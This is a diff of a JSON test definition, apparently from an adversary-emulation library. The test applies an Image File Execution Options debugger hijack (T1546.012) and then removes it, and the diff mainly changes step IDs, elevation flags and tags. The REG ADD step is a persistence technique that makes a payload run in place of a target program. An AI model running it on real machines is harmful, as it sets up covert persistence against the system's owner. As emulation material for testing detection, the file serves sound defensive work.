@@ -7,39 +7,39 @@
   ],
   "steps": [
     {
-      "id": "c26c800a-e701-4dd2-941f-17c0304dee7d",
+      "id": "8c9d70ab-bff2-40c8-84d9-477c725412a2",
       "type": "execute-command",
       "data": {
         "command": "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\#{target_binary}\" /v Debugger /d \"#{payload_binary}\"\n",
         "command_type": "command_prompt"
       },
-      "elevation_required": false
+      "elevation_required": true
     },
     {
-      "id": "55f3f31e-f4d2-419b-840a-8c7687dd6023",
+      "id": "7252b1e5-5cb3-4446-8f75-f544863e8c83",
       "type": "execute-command",
       "data": {
         "command": "reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\#{target_binary}\" /v Debugger /f \u003enul 2\u003e\u00261\n",
         "command_type": "command_prompt"
       },
-      "elevation_required": false
+      "elevation_required": true
     }
   ],
   "flows": [
     {
-      "s": "c26c800a-e701-4dd2-941f-17c0304dee7d",
+      "s": "8c9d70ab-bff2-40c8-84d9-477c725412a2",
       "p": "on-success",
-      "o": "55f3f31e-f4d2-419b-840a-8c7687dd6023"
+      "o": "7252b1e5-5cb3-4446-8f75-f544863e8c83"
     },
     {
-      "s": "c26c800a-e701-4dd2-941f-17c0304dee7d",
+      "s": "8c9d70ab-bff2-40c8-84d9-477c725412a2",
       "p": "on-failure",
-      "o": "55f3f31e-f4d2-419b-840a-8c7687dd6023"
+      "o": "7252b1e5-5cb3-4446-8f75-f544863e8c83"
     }
   ],
   "tags": [
-    "T1546.012",
-    "atomic-red-team"
+    "T1546",
+    "T1546.012"
   ],
   "input_arguments": [
     {
